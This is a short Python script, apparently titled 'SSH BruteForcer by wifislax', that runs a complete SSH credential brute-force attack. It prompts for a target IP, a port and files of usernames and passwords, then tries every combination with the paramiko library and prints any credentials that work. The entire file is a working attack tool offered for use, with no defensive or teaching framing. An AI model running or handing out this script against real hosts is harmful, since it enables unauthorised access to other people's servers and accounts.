import paramiko,sys,os

print("************ SSH BruteForcer by wifislax **************")

target = str(input('Please enter target IP address: '))
port = str(input('Please enter the SSH port number: '))
username_file = str(input('Please enter user file: '))
password_file = str(input('Please enter password file: '))

def ssh_connect(password, username, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

# open username file
fileu = open(username_file, 'r')

for lineu in fileu.readlines():
    username = lineu.strip()
    # open password file
    filep = open(password_file, 'r') 
    for linep in filep.readlines():
        password = linep.strip()
        
        try:
            print("Testing " + username + ":" + password)
            response = ssh_connect(password, username)
            if response == 0:
                print('Credentials found!> '+ username + ":" + password)
            elif response == 1: 
                print('Incorrect')
        except Exception as e:
            print(e)

filep.close()
fileu.close()
